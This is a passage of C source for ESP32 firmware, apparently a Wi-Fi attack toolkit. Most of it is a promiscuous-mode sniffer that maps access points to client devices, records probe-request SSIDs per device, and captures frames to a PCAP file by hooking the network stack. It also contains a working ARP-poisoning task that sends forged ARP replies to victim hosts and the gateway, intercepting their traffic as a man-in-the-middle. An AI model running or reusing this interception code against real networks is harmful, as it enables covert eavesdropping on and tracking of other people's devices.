    }
    // Broadcast: ff:ff:ff:ff:ff:ff
    if (mac[0] == 0xff && mac[1] == 0xff && mac[2] == 0xff &&
        mac[3] == 0xff && mac[4] == 0xff && mac[5] == 0xff) {
        return true;
    }
    // General multicast (first bit of first octet is 1)
    if (mac[0] & 0x01) {
        return true;
    }
    return false;
}

static bool is_broadcast_bssid(const uint8_t *bssid) {
    return (bssid[0] == 0xff && bssid[1] == 0xff && bssid[2] == 0xff &&
            bssid[3] == 0xff && bssid[4] == 0xff && bssid[5] == 0xff);
}

static bool is_own_device_mac(const uint8_t *mac) {
    // Get our own MAC address
    uint8_t own_mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, own_mac);
    
    if (memcmp(mac, own_mac, 6) == 0) {
        return true;
    }
    
    // Also check AP interface MAC
    esp_wifi_get_mac(WIFI_IF_AP, own_mac);
    if (memcmp(mac, own_mac, 6) == 0) {
        return true;
    }
    
    return false;
}


static void add_client_to_ap(int ap_index, const uint8_t *client_mac, int rssi) {
    static uint32_t add_client_counter = 0;
    add_client_counter++;
    
    if ((add_client_counter % 10) == 0) {
        //printf("ADD_CLIENT_HEARTBEAT: Call %lu, AP index %d\n", add_client_counter, ap_index);
    }
    
    if (ap_index < 0 || ap_index >= sniffer_ap_count) {
        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] add_client_to_ap: Invalid AP index %d (max: %d)", ap_index, sniffer_ap_count);
        }
        return;
    }
    
    sniffer_ap_t *ap = &sniffer_aps[ap_index];
    
    // Check if client already exists
    for (int i = 0; i < ap->client_count; i++) {
        if (memcmp(ap->clients[i].mac, client_mac, 6) == 0) {
            // Update existing client
            ap->clients[i].rssi = rssi;
            ap->clients[i].last_seen = esp_timer_get_time() / 1000; // ms
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] add_client_to_ap: Updated existing client %02X:%02X:%02X:%02X:%02X:%02X in AP %s (RSSI: %d)", 
                           client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5], 
                           ap->ssid, rssi);
            }
            return;
        }
    }
    
    // Add new client if space available
    if (ap->client_count < MAX_CLIENTS_PER_AP) {
        int index = ap->client_count++;
        memcpy(ap->clients[index].mac, client_mac, 6);
        ap->clients[index].rssi = rssi;
        ap->clients[index].last_seen = esp_timer_get_time() / 1000; // ms
        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] add_client_to_ap: Added NEW client %02X:%02X:%02X:%02X:%02X:%02X to AP %s (RSSI: %d, total clients: %d)", 
                       client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5], 
                       ap->ssid, rssi, ap->client_count);
        }
    } else {
        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] add_client_to_ap: Cannot add client - AP %s is full (%d/%d clients)", 
                       ap->ssid, ap->client_count, MAX_CLIENTS_PER_AP);
        }
    }
}

static void sniffer_process_scan_results(void) {
    if (!g_scan_done || g_scan_count == 0) {
        return;
    }
    
    MY_LOG_INFO(TAG, "Processing %u scan results for sniffer...", g_scan_count);
    
    int added_count = 0;
    
    // Add new APs from scan results (don't clear existing data)
    for (int i = 0; i < g_scan_count && sniffer_ap_count < MAX_SNIFFER_APS; i++) {
        wifi_ap_record_t *scan_ap = &g_scan_results[i];
        
        // Check if AP already exists in sniffer_aps
        bool ap_exists = false;
        for (int j = 0; j < sniffer_ap_count; j++) {
            if (memcmp(sniffer_aps[j].bssid, scan_ap->bssid, 6) == 0) {
                ap_exists = true;
                // Update info but keep clients
                sniffer_aps[j].channel = scan_ap->primary;
                sniffer_aps[j].rssi = scan_ap->rssi;
                sniffer_aps[j].last_seen = esp_timer_get_time() / 1000;
                break;
            }
        }
        
        // Add new AP if not present
        if (!ap_exists) {
            sniffer_ap_t *new_ap = &sniffer_aps[sniffer_ap_count++];
            memcpy(new_ap->bssid, scan_ap->bssid, 6);
            strncpy(new_ap->ssid, (char*)scan_ap->ssid, sizeof(new_ap->ssid) - 1);
            new_ap->ssid[sizeof(new_ap->ssid) - 1] = '\0';
            new_ap->channel = scan_ap->primary;
            new_ap->authmode = scan_ap->authmode;
            new_ap->rssi = scan_ap->rssi;
            new_ap->client_count = 0;
            new_ap->last_seen = esp_timer_get_time() / 1000;
            added_count++;
        }
    }
    
    MY_LOG_INFO(TAG, "Sniffer: added %d new APs, total %d APs in database", added_count, sniffer_ap_count);
}

static void sniffer_merge_scan_results(void) {
    if (!g_scan_done || g_scan_count == 0) {
        return;
    }

    MY_LOG_INFO(TAG, "Merging %u scan results into sniffer list...", g_scan_count);

    for (int i = 0; i < g_scan_count; i++) {
        wifi_ap_record_t *scan_ap = &g_scan_results[i];
        int existing = -1;

        for (int j = 0; j < sniffer_ap_count; j++) {
            if (memcmp(sniffer_aps[j].bssid, scan_ap->bssid, 6) == 0) {
                existing = j;
                break;
            }
        }

        if (existing >= 0) {
            sniffer_ap_t *sniffer_ap = &sniffer_aps[existing];
            strncpy(sniffer_ap->ssid, (char*)scan_ap->ssid, sizeof(sniffer_ap->ssid) - 1);
            sniffer_ap->ssid[sizeof(sniffer_ap->ssid) - 1] = '\0';
            sniffer_ap->channel = scan_ap->primary;
            sniffer_ap->authmode = scan_ap->authmode;
            sniffer_ap->rssi = scan_ap->rssi;
            sniffer_ap->last_seen = esp_timer_get_time() / 1000; // ms
            continue;
        }

        if (sniffer_ap_count >= MAX_SNIFFER_APS) {
            continue;
        }

        sniffer_ap_t *sniffer_ap = &sniffer_aps[sniffer_ap_count++];
        memset(sniffer_ap, 0, sizeof(*sniffer_ap));
        memcpy(sniffer_ap->bssid, scan_ap->bssid, 6);
        strncpy(sniffer_ap->ssid, (char*)scan_ap->ssid, sizeof(sniffer_ap->ssid) - 1);
        sniffer_ap->ssid[sizeof(sniffer_ap->ssid) - 1] = '\0';
        sniffer_ap->channel = scan_ap->primary;
        sniffer_ap->authmode = scan_ap->authmode;
        sniffer_ap->rssi = scan_ap->rssi;
        sniffer_ap->client_count = 0;
        sniffer_ap->last_seen = esp_timer_get_time() / 1000; // ms
    }

    MY_LOG_INFO(TAG, "Sniffer list now has %d APs", sniffer_ap_count);
}

static void sniffer_init_selected_networks(void) {
    if (g_selected_count == 0 || !g_scan_done) {
        MY_LOG_INFO(TAG, "Cannot initialize selected networks - no selection or scan data");
        return;
    }
    
    MY_LOG_INFO(TAG, "Initializing sniffer for %d selected networks...", g_selected_count);
    
    // Only clear channel list, NOT sniffer_aps data (preserve all captured clients)
    sniffer_selected_channels_count = 0;
    memset(sniffer_selected_channels, 0, sizeof(sniffer_selected_channels));
    
    // Build channel list and ensure selected networks exist in sniffer_aps
    for (int i = 0; i < g_selected_count; i++) {
        int idx = g_selected_indices[i];
        if (idx < 0 || idx >= (int)g_scan_count) {
            MY_LOG_INFO(TAG, "Warning: Invalid selected index %d, skipping", idx);
            continue;
        }
        
        wifi_ap_record_t *scan_ap = &g_scan_results[idx];
        
        // Add channel to hop list
        bool channel_exists = false;
        for (int j = 0; j < sniffer_selected_channels_count; j++) {
            if (sniffer_selected_channels[j] == scan_ap->primary) {
                channel_exists = true;
                break;
            }
        }
        if (!channel_exists && sniffer_selected_channels_count < MAX_AP_CNT) {
            sniffer_selected_channels[sniffer_selected_channels_count++] = scan_ap->primary;
        }
        
        // Ensure this AP exists in sniffer_aps (add only if not present)
        bool ap_exists = false;
        for (int j = 0; j < sniffer_ap_count; j++) {
            if (memcmp(sniffer_aps[j].bssid, scan_ap->bssid, 6) == 0) {
                ap_exists = true;
                // Update info but keep clients
                sniffer_aps[j].channel = scan_ap->primary;
                sniffer_aps[j].rssi = scan_ap->rssi;
                sniffer_aps[j].last_seen = esp_timer_get_time() / 1000;
                break;
            }
        }
        if (!ap_exists && sniffer_ap_count < MAX_SNIFFER_APS) {
            sniffer_ap_t *new_ap = &sniffer_aps[sniffer_ap_count++];
            memcpy(new_ap->bssid, scan_ap->bssid, 6);
            strncpy(new_ap->ssid, (char*)scan_ap->ssid, sizeof(new_ap->ssid) - 1);
            new_ap->ssid[sizeof(new_ap->ssid) - 1] = '\0';
            new_ap->channel = scan_ap->primary;
            new_ap->authmode = scan_ap->authmode;
            new_ap->rssi = scan_ap->rssi;
            new_ap->client_count = 0;
            new_ap->last_seen = esp_timer_get_time() / 1000;
        }
        
        MY_LOG_INFO(TAG, "  [%d] SSID='%s' Ch=%d", i + 1, (char*)scan_ap->ssid, scan_ap->primary);
    }
    
    MY_LOG_INFO(TAG, "Sniffer: %d networks on %d channel(s), total %d APs in database", 
               g_selected_count, sniffer_selected_channels_count, sniffer_ap_count);
    
    // Log channels
    if (sniffer_selected_channels_count > 0) {
        char channel_list[128] = {0};
        int offset = 0;
        for (int i = 0; i < sniffer_selected_channels_count && offset < 120; i++) {
            offset += snprintf(channel_list + offset, sizeof(channel_list) - offset, 
                             "%d%s", sniffer_selected_channels[i], 
                             (i < sniffer_selected_channels_count - 1) ? ", " : "");
        }
        MY_LOG_INFO(TAG, "Channel hopping list: [%s]", channel_list);
    }
}

static void sniffer_channel_hop(void) {
    if (!sniffer_active || sniffer_scan_phase) {
        return;
    }
    
    // Check if we're in selected networks mode
    if (sniffer_selected_mode && sniffer_selected_channels_count > 0) {
        // Use selected channels only
        sniffer_current_channel = sniffer_selected_channels[sniffer_channel_index];
        
        sniffer_channel_index++;
        if (sniffer_channel_index >= sniffer_selected_channels_count) {
            sniffer_channel_index = 0;
        }
    } else {
        // Use dual-band channel hopping (like Marauder)
        sniffer_current_channel = dual_band_channels[sniffer_channel_index];
        
        sniffer_channel_index++;
        if (sniffer_channel_index >= dual_band_channels_count) {
            sniffer_channel_index = 0;
        }
    }
    
    esp_wifi_set_channel(sniffer_current_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_last_channel_hop = esp_timer_get_time() / 1000;
    
    // Optional: Log channel changes with band info (debug mode)
    #if 0
    const char* band = (sniffer_current_channel <= 14) ? "2.4GHz" : "5GHz";
    MY_LOG_INFO(TAG, "Sniffer: Hopped to channel %d (%s)", sniffer_current_channel, band);
    #endif
}

// Task that handles time-based channel hopping (independent of packet flow)
static void sniffer_channel_task(void *pvParameters) {
    int64_t sniff_oled_last_us = 0;
    
    while (sniffer_active) {
        vTaskDelay(pdMS_TO_TICKS(50)); // Check every 50ms
        
        if (!sniffer_active || sniffer_scan_phase) {
            continue;
        }
        
        // Force channel hop if 250ms passed
        int64_t current_time = esp_timer_get_time() / 1000;
        bool time_expired = (current_time - sniffer_last_channel_hop >= sniffer_channel_hop_delay_ms);
        
        if (time_expired) {
            sniffer_channel_hop();
        }
        
        // OLED update (~500ms)
        int64_t now_us = esp_timer_get_time();
        if (now_us - sniff_oled_last_us > 500000) {
            sniff_oled_last_us = now_us;
            char l2[64], l3[64], l4[64];
            snprintf(l2, sizeof(l2), "  Ch %d hopping", sniffer_current_channel);
            snprintf(l3, sizeof(l3), "  AP:%d Probes:%d", sniffer_ap_count, probe_request_count);
            snprintf(l4, sizeof(l4), "  Pkts: %lu", (unsigned long)sniff_oled_packets);
            oled_display_update_full("> Sniffer", l2, l3, l4);
        }
    }
    
    MY_LOG_INFO(TAG, "Sniffer channel task ending");
    vTaskDelete(NULL);
}

// ============================================================================
// PCAP capture functions
// ============================================================================

static void pcap_enqueue_frame(const uint8_t *data, uint16_t len) {
    if (!pcap_capture_active || !pcap_packet_queue || len == 0) return;

    pcap_queued_frame_t *frame = malloc(sizeof(pcap_queued_frame_t) + len);
    if (!frame) return;

    frame->len = len;
    frame->timestamp_us = esp_timer_get_time();
    memcpy(frame->data, data, len);

    if (xQueueSend(pcap_packet_queue, &frame, 0) != pdTRUE) {
        free(frame);
        pcap_capture_drop_count++;
    }
}

static void pcap_radio_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!pcap_capture_active) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len == 0) return;
    pcap_enqueue_frame(pkt->payload, len);
}

static err_t pcap_netif_input_hook(struct pbuf *p, struct netif *inp) {
    if (pcap_capture_active && p && p->tot_len > 0 && p->tot_len <= 1600) {
        uint8_t tmp[1600];
        uint16_t copied = pbuf_copy_partial(p, tmp, p->tot_len, 0);
        if (copied > 0) {
            pcap_enqueue_frame(tmp, copied);
        }
    }
    return pcap_original_input(p, inp);
}

static err_t pcap_netif_linkoutput_hook(struct netif *netif, struct pbuf *p) {
    if (pcap_capture_active && p && p->tot_len > 0 && p->tot_len <= 1600) {
        uint8_t tmp[1600];
        uint16_t copied = pbuf_copy_partial(p, tmp, p->tot_len, 0);
        if (copied > 0) {
            pcap_enqueue_frame(tmp, copied);
        }
    }
    return pcap_original_linkoutput(netif, p);
}

static void pcap_writer_task(void *param) {
    (void)param;
    uint32_t flush_counter = 0;
    pcap_queued_frame_t *frame = NULL;

    MY_LOG_INFO(TAG, "PCAP writer task started");

    while (pcap_capture_active) {
        if (xQueueReceive(pcap_packet_queue, &frame, pdMS_TO_TICKS(200)) == pdTRUE) {
            pcap_record_header_t rec = {
                .ts_sec  = (uint32_t)(frame->timestamp_us / 1000000),
                .ts_usec = (uint32_t)(frame->timestamp_us % 1000000),
                .incl_len = frame->len,
                .orig_len = frame->len
            };
            fwrite(&rec, 1, sizeof(rec), pcap_capture_file);
            fwrite(frame->data, 1, frame->len, pcap_capture_file);
            free(frame);
            pcap_capture_frame_count++;
            flush_counter++;
            if (flush_counter >= 50) {
                fflush(pcap_capture_file);
                flush_counter = 0;
            }
        }
    }

    while (xQueueReceive(pcap_packet_queue, &frame, 0) == pdTRUE) {
        pcap_record_header_t rec = {
            .ts_sec  = (uint32_t)(frame->timestamp_us / 1000000),
            .ts_usec = (uint32_t)(frame->timestamp_us % 1000000),
            .incl_len = frame->len,
            .orig_len = frame->len
        };
        fwrite(&rec, 1, sizeof(rec), pcap_capture_file);
        fwrite(frame->data, 1, frame->len, pcap_capture_file);
        free(frame);
        pcap_capture_frame_count++;
    }

    fflush(pcap_capture_file);
    fclose(pcap_capture_file);
    pcap_capture_file = NULL;
    sd_sync();

    MY_LOG_INFO(TAG, "PCAP writer done: %s (%lu frames, %lu drops)",
                pcap_capture_filepath,
                (unsigned long)pcap_capture_frame_count,
                (unsigned long)pcap_capture_drop_count);

    pcap_writer_task_handle = NULL;
    vTaskDelete(NULL);
}

static void pcap_arp_spoof_task(void *param) {
    (void)param;

    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        MY_LOG_INFO(TAG, "ARP spoof: STA netif not found");
        pcap_arp_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    struct netif *lwip_nif = (struct netif *)esp_netif_get_netif_impl(sta_netif);
    if (!lwip_nif || !lwip_nif->linkoutput) {
        MY_LOG_INFO(TAG, "ARP spoof: lwIP netif or linkoutput not available");
        pcap_arp_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    MY_LOG_INFO(TAG, "ARP spoof: Poisoning %d hosts + gateway", pcap_arp_host_count);
    uint32_t round = 0;

    while (pcap_arp_active) {
        for (int i = 0; i < pcap_arp_host_count && pcap_arp_active; i++) {
            send_arp_reply(lwip_nif,
                           pcap_arp_hosts[i].mac,   // Eth dst: victim
                           pcap_arp_own_mac,         // Eth src: our MAC
                           pcap_arp_own_mac,         // ARP sender MAC: our MAC
                           pcap_arp_gateway_ip,      // ARP sender IP: gateway (spoofed)
                           pcap_arp_hosts[i].mac,    // ARP target MAC: victim
                           pcap_arp_hosts[i].ip);    // ARP target IP: victim

            send_arp_reply(lwip_nif,
                           pcap_arp_gateway_mac,     // Eth dst: gateway
                           pcap_arp_own_mac,          // Eth src: our MAC
                           pcap_arp_own_mac,          // ARP sender MAC: our MAC
                           pcap_arp_hosts[i].ip,      // ARP sender IP: victim (spoofed)
                           pcap_arp_gateway_mac,      // ARP target MAC: gateway
                           pcap_arp_gateway_ip);      // ARP target IP: gateway

            vTaskDelay(pdMS_TO_TICKS(10));
        }

        round++;
        if (round % 5 == 0) {
            MY_LOG_INFO(TAG, "ARP spoof: round %lu, %d hosts, captured %lu, dropped %lu",
                        (unsigned long)round, pcap_arp_host_count,
                        (unsigned long)pcap_capture_frame_count,
                        (unsigned long)pcap_capture_drop_count);
        }

        vTaskDelay(pdMS_TO_TICKS(2000));
    }

    MY_LOG_INFO(TAG, "ARP spoof: Sending corrective ARP to restore network...");
    for (int pass = 0; pass < 3; pass++) {
        for (int i = 0; i < pcap_arp_host_count; i++) {
            send_arp_reply(lwip_nif,
                           pcap_arp_hosts[i].mac,
                           pcap_arp_gateway_mac,
                           pcap_arp_gateway_mac,
                           pcap_arp_gateway_ip,
                           pcap_arp_hosts[i].mac,
                           pcap_arp_hosts[i].ip);

            send_arp_reply(lwip_nif,
                           pcap_arp_gateway_mac,
                           pcap_arp_hosts[i].mac,
                           pcap_arp_hosts[i].mac,
                           pcap_arp_hosts[i].ip,
                           pcap_arp_gateway_mac,
                           pcap_arp_gateway_ip);
        }
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    MY_LOG_INFO(TAG, "ARP spoof: Network restored, task ending");
    pcap_arp_task_handle = NULL;
    vTaskDelete(NULL);
}

static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    sniffer_packet_counter++;
    sniff_oled_packets = sniffer_packet_counter;
    sniff_oled_dirty = true;
    
    if (!sniffer_active || sniffer_scan_phase) {
        return; // No debug logging here - too frequent
    }
    
    // Show packet count every 20 packets when debug is OFF
    if (!sniff_debug && (sniffer_packet_counter % 20) == 0) {
        printf("Sniffer packet count: %lu\n", sniffer_packet_counter);
    }
    
    // Perform packet-based channel hopping (10 packets OR time-based task will handle it)
    if ((sniffer_packet_counter % 10) == 0) {
        //MY_LOG_INFO(TAG, "Sniffer: Packet-based channel hop (10 packets)");
        sniffer_channel_hop();
    }
    
    // Throttle debug logging - only every 100th packet when debug is on
    bool should_debug = sniff_debug && ((sniffer_packet_counter - sniffer_last_debug_packet) >= 100);
    if (should_debug) {
        sniffer_last_debug_packet = sniffer_packet_counter;
        printf("DEBUG_CHECKPOINT: Processing packet %lu\n", sniffer_packet_counter);
    }
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    if (should_debug) {
        const char* type_str = (type == WIFI_PKT_MGMT) ? "MGMT" : 
                              (type == WIFI_PKT_DATA) ? "DATA" : 
                              (type == WIFI_PKT_CTRL) ? "CTRL" : "UNKNOWN";
        
        MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Type=%s, Len=%d, Ch=%d, RSSI=%d", 
                   sniffer_packet_counter, type_str, len, sniffer_current_channel, pkt->rx_ctrl.rssi);
        
        if (len >= 24) {
            MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Addr1=%02X:%02X:%02X:%02X:%02X:%02X, Addr2=%02X:%02X:%02X:%02X:%02X:%02X, Addr3=%02X:%02X:%02X:%02X:%02X:%02X",
                       sniffer_packet_counter,
                       frame[4], frame[5], frame[6], frame[7], frame[8], frame[9],
                       frame[10], frame[11], frame[12], frame[13], frame[14], frame[15],
                       frame[16], frame[17], frame[18], frame[19], frame[20], frame[21]);
        }
    }
    
    // Filter only MGMT and DATA packets (like Marauder)
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) {
        // Skip logging for non-MGMT/DATA packets - too frequent
        return;
    }
    
    if (len < 24) { // Minimum 802.11 header size
        return; // Skip logging - too frequent
    }
    
    // Skip broadcast packets ONLY for DATA packets
    // MGMT packets (beacons, probe requests) normally have broadcast destinations
    bool is_broadcast_dest = (frame[4] == 0xff && frame[5] == 0xff && frame[6] == 0xff &&
                             frame[7] == 0xff && frame[8] == 0xff && frame[9] == 0xff);
    
    if (is_broadcast_dest && type == WIFI_PKT_DATA) {
        return; // Skip logging - too frequent
    }
    
    // Parse 802.11 header (like Marauder)
    uint8_t frame_type = frame[0] & 0xFC;
    uint8_t to_ds = (frame[1] & 0x01) != 0;
    uint8_t from_ds = (frame[1] & 0x02) != 0;
    
    // Extract addresses based on 802.11 standard
    uint8_t *addr1 = (uint8_t *)&frame[4];   // Address 1
    uint8_t *addr2 = (uint8_t *)&frame[10];  // Address 2  
    uint8_t *addr3 = (uint8_t *)&frame[16];  // Address 3
    
    if (sniff_debug) {
        // Minimal debug logging to avoid blocking
        printf("PKT_%lu: %s T=%d F=%d\n", sniffer_packet_counter, 
               (type == WIFI_PKT_MGMT) ? "MGMT" : "DATA", to_ds, from_ds);
    }
    
    // Process MGMT packets for client detection (like Marauder)
    if (type == WIFI_PKT_MGMT) {
        if (should_debug) printf("DEBUG: Processing MGMT packet %lu\n", sniffer_packet_counter);
        
        uint8_t *client_mac = NULL;
        uint8_t *ap_mac = NULL;
        bool is_client_frame = false;
        
        switch (frame_type) {
            case 0x80: // Beacon - update AP info only
                ap_mac = addr2; // Source is AP
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Beacon from AP: %02X:%02X:%02X:%02X:%02X:%02X", 
                               sniffer_packet_counter, ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
                }
                // Update AP info if exists
                for (int i = 0; i < sniffer_ap_count; i++) {
                    if (memcmp(sniffer_aps[i].bssid, ap_mac, 6) == 0) {
                        sniffer_aps[i].last_seen = esp_timer_get_time() / 1000;
                        sniffer_aps[i].rssi = pkt->rx_ctrl.rssi;
                        break;
                    }
                }
                return; // Don't process beacons for client detection
                
            case 0x40: // Probe Request - client looking for networks
                client_mac = addr2; // Source is client
                is_client_frame = true;
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Probe Request from client: %02X:%02X:%02X:%02X:%02X:%02X", 
                               sniffer_packet_counter, client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5]);
                }
                break;
                
            case 0x00: // Association Request - client trying to connect to AP
                client_mac = addr2; // Source is client
                ap_mac = addr1;     // Destination is AP
                is_client_frame = true;
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Association Request from client %02X:%02X:%02X:%02X:%02X:%02X to AP %02X:%02X:%02X:%02X:%02X:%02X", 
                               sniffer_packet_counter, client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
                               ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
                }
                break;
                
            case 0xB0: // Authentication - client authenticating with AP
                client_mac = addr2; // Source is client
                ap_mac = addr1;     // Destination is AP
                is_client_frame = true;
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Authentication from client %02X:%02X:%02X:%02X:%02X:%02X to AP %02X:%02X:%02X:%02X:%02X:%02X", 
                               sniffer_packet_counter, client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
                               ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
                }
                break;
                
            default:
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - Other MGMT frame type 0x%02X", sniffer_packet_counter, frame_type);
                }
                return;
        }
        
        // Process client frames
        if (is_client_frame && client_mac) {
            // Skip multicast/broadcast client MAC
            if (is_multicast_mac(client_mac) || is_own_device_mac(client_mac)) {
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - multicast or own device MAC", sniffer_packet_counter);
                }
                return;
            }
            
            // For probe requests, extract SSID and store
            if (frame_type == 0x40) {
                // Parse probe request to extract SSID
                // Probe request format: MAC header (24 bytes) + Frame body
                // Frame body starts with fixed parameters, then tagged parameters
                // SSID is usually the first tagged parameter (Tag Number = 0)
                
                if (len > 24 && probe_request_count < MAX_PROBE_REQUESTS) {
                    const uint8_t *body = frame + 24; // Skip MAC header
                    int body_len = len - 24;
                    
                    char ssid[33] = {0};
                    bool ssid_found = false;
                    uint8_t ssid_length = 0;
                    
                    // Parse tagged parameters to find SSID (tag 0)
                    int offset = 0;
                    while (offset + 2 <= body_len) {
                        uint8_t tag_number = body[offset];
                        uint8_t tag_length = body[offset + 1];
                        
                        if (offset + 2 + tag_length > body_len) {
                            break; // Invalid tag
                        }
                        
                        if (tag_number == 0) { // SSID tag
                            ssid_length = tag_length;
                            if (tag_length > 0 && tag_length <= 32) {
                                memcpy(ssid, &body[offset + 2], tag_length);
                                ssid[tag_length] = '\0';
                                ssid_found = true;
                            } else if (tag_length == 0) {
                                strcpy(ssid, "<Broadcast>");
                                ssid_found = true;
                            }
                            break;
                        }
                        
                        offset += 2 + tag_length;
                    }
                    
                    // Store probe request if SSID found and not broadcast probe
                    if (ssid_found && ssid_length > 0) {
                        // Check if this MAC+SSID combination already exists
                        bool already_exists = false;
                        for (int i = 0; i < probe_request_count; i++) {
                            if (memcmp(probe_requests[i].mac, client_mac, 6) == 0 &&
                                strcmp(probe_requests[i].ssid, ssid) == 0) {
                                // Update existing entry
                                probe_requests[i].last_seen = esp_timer_get_time() / 1000;
                                probe_requests[i].rssi = pkt->rx_ctrl.rssi;
                                already_exists = true;
                                break;
                            }
                        }
                        
                        // Add new probe request if not exists
                        if (!already_exists) {
                            memcpy(probe_requests[probe_request_count].mac, client_mac, 6);
                            strncpy(probe_requests[probe_request_count].ssid, ssid, sizeof(probe_requests[probe_request_count].ssid) - 1);
                            probe_requests[probe_request_count].rssi = pkt->rx_ctrl.rssi;
                            probe_requests[probe_request_count].last_seen = esp_timer_get_time() / 1000;
                            probe_request_count++;
                            
                            if (sniff_debug) {
                                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Stored probe request for SSID '%s' from %02X:%02X:%02X:%02X:%02X:%02X", 
                                           sniffer_packet_counter, ssid,
                                           client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5]);
                            }
                        }
                    }
                }
                return; // Don't process probe requests for AP client association
            }
            
            // For association/auth requests, find or create the target AP
            if (ap_mac) {
                int ap_index = -1;
                for (int i = 0; i < sniffer_ap_count; i++) {
                    if (memcmp(sniffer_aps[i].bssid, ap_mac, 6) == 0) {
                        ap_index = i;
                        break;
                    }
                }
                
                // If AP not found, create it dynamically (only in normal mode)
                // In selected mode, only monitor pre-selected networks
                if (ap_index < 0 && !sniffer_selected_mode && sniffer_ap_count < MAX_SNIFFER_APS) {
                    ap_index = sniffer_ap_count++;
                    memcpy(sniffer_aps[ap_index].bssid, ap_mac, 6);
                    snprintf(sniffer_aps[ap_index].ssid, sizeof(sniffer_aps[ap_index].ssid), 
                            "MGMT_%02X%02X", ap_mac[4], ap_mac[5]);
                    sniffer_aps[ap_index].channel = sniffer_current_channel;
                    sniffer_aps[ap_index].authmode = WIFI_AUTH_OPEN;
                    sniffer_aps[ap_index].rssi = pkt->rx_ctrl.rssi;
                    sniffer_aps[ap_index].client_count = 0;
                    sniffer_aps[ap_index].last_seen = esp_timer_get_time() / 1000;
                    
                    if (sniff_debug) {
                        MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: CREATED new AP %s from MGMT frame", 
                                   sniffer_packet_counter, sniffer_aps[ap_index].ssid);
                    }
                }
                
                if (ap_index >= 0) {
                    if (sniff_debug) {
                        MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: ACCEPTED - Adding client %02X:%02X:%02X:%02X:%02X:%02X to AP %s", 
                                   sniffer_packet_counter, client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
                                   sniffer_aps[ap_index].ssid);
                    }
                    add_client_to_ap(ap_index, client_mac, pkt->rx_ctrl.rssi);
                } else {
                    if (sniff_debug) {
                        MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - AP list full, cannot create new AP", sniffer_packet_counter);
                    }
                }
            }
        }
        return;
    }
    
    // Process DATA packets using 802.11 ToDS/FromDS logic (like Marauder)
    if (type == WIFI_PKT_DATA) {
        if (should_debug) printf("DEBUG: Processing DATA packet %lu\n", sniffer_packet_counter);
        
        uint8_t *client_mac = NULL;
        uint8_t *ap_mac = NULL;
        
        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Processing DATA packet, ToDS=%d, FromDS=%d", 
                       sniffer_packet_counter, to_ds, from_ds);
        }
        
        // Determine AP and client MAC based on ToDS/FromDS bits (802.11 standard)
        if (to_ds && !from_ds) {
            // STA -> AP: addr1=AP, addr2=STA, addr3=DA
            ap_mac = addr1;      // Destination is AP
            client_mac = addr2;  // Source is client
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: STA->AP direction", sniffer_packet_counter);
            }
        } else if (!to_ds && from_ds) {
            // AP -> STA: addr1=STA, addr2=AP, addr3=SA  
            ap_mac = addr2;      // Source is AP
            client_mac = addr1;  // Destination is client
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: AP->STA direction", sniffer_packet_counter);
            }
        } else if (!to_ds && !from_ds) {
            // IBSS (ad-hoc): addr1=DA, addr2=SA, addr3=BSSID
            ap_mac = addr3;      // BSSID
            client_mac = addr2;  // Source
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: IBSS direction", sniffer_packet_counter);
            }
        } else {
            // WDS (to_ds && from_ds) - skip for now
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - WDS frame (ToDS=1, FromDS=1)", sniffer_packet_counter);
            }
            return;
        }
        
